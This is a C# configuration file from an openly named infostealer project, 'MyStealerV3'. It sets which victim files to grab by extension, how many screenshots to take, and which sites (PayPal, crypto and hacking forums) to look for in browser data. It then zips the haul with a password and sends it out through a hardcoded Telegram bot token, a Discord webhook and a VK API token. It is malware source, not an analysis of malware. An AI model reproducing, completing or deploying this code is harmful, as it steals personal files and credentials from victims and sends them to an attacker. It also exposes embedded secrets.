using System;
using System.Collections.Generic;

namespace MyStealerV3
{
    enum sendMethods
    {
        Telegram = 0,
        Discord = 1,
    }
    enum MessageType
    {
        sendArchive = 0,
        sendError = 1,
        sendLog = 2
    }
    internal static class Config
    {
        //debug
        public static string ERROR_MESSAGE = "";
        public static string LOG_MESSAGE = "";
        public static bool SendLog = false;

        //file graber
        public static string[] extensions =
        {
            ".txt",
            ".jpg",
            ".png",
            ".docx",
            ".zip",
        };
        public static int MaxFileSizeInKB = 1024;

        //screenshots settings
        public const int ScreenshotsCount = 1;
        public const int ScreenshotInterval = 1000; // in ms

        //Url search
        public static List<string> CheckedUrls = new List<string>
        {
            "youtube.com",
            "lolz.guru",
            "paypal.com",
            "github.com",
            "xss.is",
            "minergate.com",
            "btc.com"
        };

        //result settings
        public const string ZipPassword = "44";
        public static string ZipExtension = "zip";
        public static readonly string zipArchivePath = $@"{Resource.Help.Help.ExploitDir}\{Environment.MachineName} ({DateTime.Now.ToString("MM/dd/yyyy")}).{ZipExtension}";
        public const sendMethods sendMethod = sendMethods.Telegram; // Куда кидать архив

        //telegram
        public const string TelegramToken = "5315291273:AAFiCQnpXXVeK3OzJk3qJCR7lHNfrmSH9X0";
        public const int TelegramChatID = 1017254880;

        //discord
        public const string DiscordWebHook = "https://discord.com/api/webhooks/988762738253778964/alr_OACHYc1CuDoSeg9lHACdP9XE83JFIooms2q_n04-DKclmDJnLD06XA2F0J4HK16o";

        //vkontakte
        public const string VkApiToken = "6584392fb499dc96b0506457977787caf66b4c37852fa03d531b2539bdb98ef7a85a09a5623c85d8c804e";
        public const int VkUserID = 395816914;
    }
}
